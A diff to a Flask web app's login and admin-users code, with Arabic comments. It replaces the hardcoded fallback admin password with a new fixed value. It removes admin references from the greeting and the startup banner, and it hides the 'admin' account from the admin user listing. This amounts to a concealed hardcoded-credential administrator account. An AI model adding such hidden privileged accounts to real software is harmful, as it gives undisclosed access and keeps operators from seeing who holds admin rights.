@@ -73,7 +73,7 @@ def login():
         password = request.form.get('password', '').strip()
         
         # التحقق من حساب المدير المدمج
-        admin_pass = os.environ.get('ADMIN_PASSWORD', 'admin123')
+        admin_pass = os.environ.get('ADMIN_PASSWORD', '61174271082')
         if username == 'admin' and password == admin_pass:
             # إنشاء حساب admin إذا ما موجود
             existing = db.get_user_by_username('admin')
@@ -89,7 +89,7 @@ def login():
             session['user_id'] = user['id']
             session['username'] = user['username']
             session['role'] = user['role']
-            flash('✅ مرحباً بك يا مدير!', 'success')
+            flash('✅ مرحباً بك!', 'success')
             return redirect(url_for('dashboard'))
         
         # التحقق من المستخدمين العاديين
@@ -215,6 +215,9 @@ def admin_users():
     users = db.get_all_users()
     users_with_bots = []
     for user in users:
+        # إخفاء حساب الأدمن من القائمة
+        if user['username'] == 'admin':
+            continue
         bot_count = db.count_bots(user['id'])
         users_with_bots.append({**user, 'bot_count': bot_count})
     return render_template('admin_users.html', users=users_with_bots)
@@ -566,7 +569,6 @@ if __name__ == '__main__':
 ║   {'='*37}  ║
 ║   📊 لوحة التحكم: /dashboard            ║
 ║   👥 تسجيل حساب: /register              ║
-║   🔑 المدير: admin/admin123              ║
 ╚══════════════════════════════════════════╝
     """)
     
